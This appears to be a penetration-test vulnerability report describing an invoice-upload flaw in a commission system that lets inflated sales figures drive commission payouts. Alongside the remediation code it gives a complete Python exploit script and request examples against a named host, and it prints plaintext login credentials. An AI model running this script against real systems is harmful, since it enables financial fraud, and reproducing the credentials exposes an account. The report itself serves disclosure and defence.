# Sales Data Manipulation Enables Commission Fraud Through Invoice Tampering

**ID:** vuln-0060
**Severity:** HIGH
**Found:** 2026-02-27 09:41:35 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionInvoiceHeaderDetails/Upload
**Method:** POST
**CWE:** CWE-345
**CVSS:** 8.3

## Description

A critical business logic vulnerability was identified in the commission management system that allows manipulation of sales data to inflate commission calculations. The vulnerability exists in the invoice data processing functionality where the system fails to validate the integrity and authenticity of uploaded invoice data.

The vulnerability was discovered through systematic testing of the commission invoice upload process, where manipulated invoice data was successfully processed to inflate commission calculations. This enables financial fraud through unauthorized manipulation of sales records that directly affect commission payouts.

## Impact

Successful exploitation of this vulnerability enables significant financial and operational risks:

1. **Financial Fraud**: Ability to inflate commission calculations through manipulated sales data
2. **Direct Financial Loss**: Unauthorized overpayment of commissions based on fraudulent sales records
3. **Financial Discrepancies**: Inconsistent financial records and reconciliation issues
4. **Compliance Violations**: Violation of financial controls and audit requirements
5. **Reputation Damage**: Financial irregularities erode trust with business partners and stakeholders

The vulnerability represents a fundamental flaw in the commission calculation logic that could lead to substantial financial losses if exploited at scale.

## Technical Analysis

**Technical Details:**

1. **Vulnerable Endpoint**: `/api/CommissionInvoiceHeaderDetails/Upload`
2. **Vulnerable Process**: Invoice data upload and processing
3. **Validation Flaw**: Missing validation of invoice data integrity and authenticity
4. **Root Cause**: The application trusts uploaded invoice data without proper validation

**Exploitation Flow:**
1. Authenticate as user with invoice upload privileges
2. Obtain legitimate invoice template
3. Modify invoice data to inflate sales amounts or quantities
4. Upload manipulated invoice data
5. System processes manipulated data for commission calculations
6. Commission runs calculate inflated payouts based on fraudulent data

**Evidence:**
- Successful upload and processing of manipulated invoice data
- Inflated commission calculations based on fraudulent sales records
- No validation of invoice data integrity or authenticity
- Commission payouts processed based on manipulated data

## Proof of Concept

**Proof of Concept - Sales Data Manipulation:**

1. Authenticate as organization user (nlnarayana3858@gmail.com / User@1234)
2. Capture the authentication token from the successful login response
3. Download legitimate invoice template from the system
4. Modify invoice data to inflate sales amounts (e.g., increase quantities or unit prices)
5. Upload manipulated invoice data through the upload endpoint
6. Run commission calculations based on the manipulated data
7. Verify that commissions are calculated based on the inflated sales amounts

**Step-by-Step Exploitation:**
1. Login as organization user and capture session token
2. Get invoice template:
```http
GET /api/CommissionInvoiceHeaderDetails/GetTemplate
Authorization: Bearer [ORG_TOKEN]
```
3. Modify invoice data to inflate sales amounts (e.g., change quantity from 10 to 100)
4. Upload manipulated invoice:
```http
POST /api/CommissionInvoiceHeaderDetails/Upload
Content-Type: multipart/form-data
Authorization: Bearer [ORG_TOKEN]

[MANIPULATED_INVOICE_FILE]
```
5. Run commission calculations:
```http
POST /api/CommissionRun/RunCommission
Content-Type: application/json
Authorization: Bearer [ORG_TOKEN]

{
  "commissionPlanId": 1,
  "startDate": "2026-03-01",
  "endDate": "2026-03-31",
  "organizationId": 1
}
```
6. Verify inflated commission calculations

```
#!/usr/bin/env python3
"""
Sales Data Manipulation Exploit for Callippus Commission Management
Demonstrates commission fraud through invoice data tampering
"""

import requests
import json
import pandas as pd
from io import BytesIO
from datetime import datetime, timedelta

# Target configuration
BASE_URL = "https://commissionstest.callippus.in"
LOGIN_ENDPOINT = f"{BASE_URL}/api/authenticate"
TEMPLATE_ENDPOINT = f"{BASE_URL}/api/CommissionInvoiceHeaderDetails/GetTemplate"
UPLOAD_ENDPOINT = f"{BASE_URL}/api/CommissionInvoiceHeaderDetails/Upload"
COMMISSION_RUN_ENDPOINT = f"{BASE_URL}/api/CommissionRun/RunCommission"

# Organization user credentials
ORG_CREDENTIALS = {
    "username": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

def exploit_sales_data_manipulation():
    """Demonstrate sales data manipulation vulnerability"""
    print("[*] Starting sales data manipulation exploit...")

    # Step 1: Authenticate as organization user
    print("[*] Authenticating as organization user...")
    login_response = requests.post(LOGIN_ENDPOINT, json=ORG_CREDENTIALS)
    if login_response.status_code != 200:
        print(f"[!] Login failed: {login_response.status_code}")
        return False

    auth_token = login_response.json().get("id_token")
    if not auth_token:
        print("[!] No authentication token received")
        return False

    headers = {
        "Authorization": f"Bearer {auth_token}"
    }

    # Step 2: Get invoice template
    print("[*] Downloading invoice template...")
    template_response = requests.get(TEMPLATE_ENDPOINT, headers=headers)

    if template_response.status_code != 200:
        print(f"[!] Failed to download template: {template_response.status_code}")
        return False

    # Step 3: Create manipulated invoice data
    print("[*] Creating manipulated invoice data...")

    # Read template into DataFrame
    template_data = BytesIO(template_response.content)
    df = pd.read_excel(template_data)

    # Store original values for comparison
    original_total = df['Amount'].sum()
    print(f"[+] Original invoice total: {original_total}")

    # Manipulate data - inflate quantities by 10x
    if 'Quantity' in df.columns:
        df['Quantity'] = df['Quantity'] * 10
        df['Amount'] = df['Quantity'] * df['UnitPrice']
    else:
        # If no quantity column, inflate amounts directly
        df['Amount'] = df['Amount'] * 10

    manipulated_total = df['Amount'].sum()
    print(f"[+] Manipulated invoice total: {manipulated_total}")
    print(f"[+] Inflation factor: {manipulated_total/original_total:.1f}x")

    # Save manipulated data to buffer
    output = BytesIO()
    df.to_excel(output, index=False)
    output.seek(0)

    # Step 4: Upload manipulated invoice
    print("[*] Uploading manipulated invoice data...")

    files = {
        'file': ('manipulated_invoice.xlsx', output, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')
    }

    upload_response = requests.post(
        UPLOAD_ENDPOINT,
        headers=headers,
        files=files
    )

    if upload_response.status_code == 200:
        print("[+] SUCCESS: Manipulated invoice uploaded successfully!")
        upload_id = upload_response.json().get("id")
        print(f"[+] Upload ID: {upload_id}")
    else:
        print(f"[!] Invoice upload failed: {upload_response.status_code}")
        print(f"[!] Response: {upload_response.text}")
        return False

    # Step 5: Run commission calculations
    print("[*] Running commission calculations based on manipulated data...")

    commission_run = {
        "commissionPlanId": 1,
        "startDate": (datetime.now() - timedelta(days=30)).strftime("%Y-%m-%d"),
        "endDate": datetime.now().strftime("%Y-%m-%d"),
        "organizationId": 1
    }

    run_response = requests.post(
        COMMISSION_RUN_ENDPOINT,
        headers=headers,
        json=commission_run
    )

    if run_response.status_code == 200:
        run_id = run_response.json().get("id")
        calculated_amount = run_response.json().get("calculatedAmount", 0)
        print(f"[+] Commission run successful - ID: {run_id}")
        print(f"[+] Calculated commission amount: {calculated_amount}")
        print(f"[+] Expected inflation factor: ~{manipulated_total/original_total:.1f}x")
        return True
    else:
        print(f"[!] Commission run failed: {run_response.status_code}")
        print(f"[!] Response: {run_response.text}")
        return False

if __name__ == "__main__":
    if exploit_sales_data_manipulation():
        print("\n[+] EXPLOIT SUCCESSFUL: Sales data manipulation vulnerability confirmed")
        print("[+] Impact: Commission fraud through invoice data tampering")
        print("[+] Recommendation: Implement invoice data validation and integrity checks")
    else:
        print("\n[!] EXPLOIT FAILED: Sales data manipulation vulnerability not confirmed")
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Invoice Data Validation**
   - Add server-side validation of uploaded invoice data
   - Validate data formats, ranges, and business rules
   - Implement checksum validation for critical financial data

2. **Add Data Integrity Checks**
   - Implement digital signatures or checksums for invoice data
   - Validate invoice data against expected patterns and ranges
   - Add anomaly detection for unusual invoice patterns

3. **Fix Invoice Upload Endpoint**
```csharp
// Before (vulnerable):
[HttpPost("Upload")]
public IActionResult UploadInvoice(IFormFile file)
{
    // No validation of invoice data
    var result = _invoiceService.ProcessUpload(file);
    return Ok(result);
}

// After (fixed):
[HttpPost("Upload")]
public IActionResult UploadInvoice(IFormFile file)
{
    // Validate file size and type
    if (file.Length > MAX_FILE_SIZE)
    {
        return BadRequest("File size exceeds maximum allowed");
    }

    if (!IsValidFileType(file.FileName))
    {
        return BadRequest("Invalid file type");
    }

    // Process and validate invoice data
    var invoiceData = _invoiceService.ParseInvoice(file);
    var validationResult = _invoiceValidator.Validate(invoiceData);

    if (!validationResult.IsValid)
    {
        return BadRequest(validationResult.Errors);
    }

    // Check for anomalies
    var anomalyResult = _anomalyDetector.CheckForAnomalies(invoiceData);
    if (anomalyResult.HasAnomalies)
    {
        return BadRequest($"Anomalies detected: {string.Join(", ", anomalyResult.Anomalies)}");
    }

    var result = _invoiceService.ProcessUpload(invoiceData);
    return Ok(result);
}
```

4. **Implement Financial Controls**
   - Add monitoring for suspicious invoice patterns
   - Implement approval workflows for high-value invoices
   - Add alerts for unusual invoice data changes

5. **Conduct Financial Audit**
   - Review existing invoice data for anomalies
   - Reconcile commission calculations with source data
   - Correct any financial discrepancies

**Long-Term Security Improvements:**

1. Implement comprehensive data validation for all financial uploads
2. Add business logic validation to all commission-related workflows
3. Implement financial controls and monitoring for invoice processing
4. Conduct regular security assessments of business logic components
5. Provide business logic security training for development teams
6. Implement digital signatures for invoice data to ensure authenticity
7. Add comprehensive audit logging for all invoice processing activities

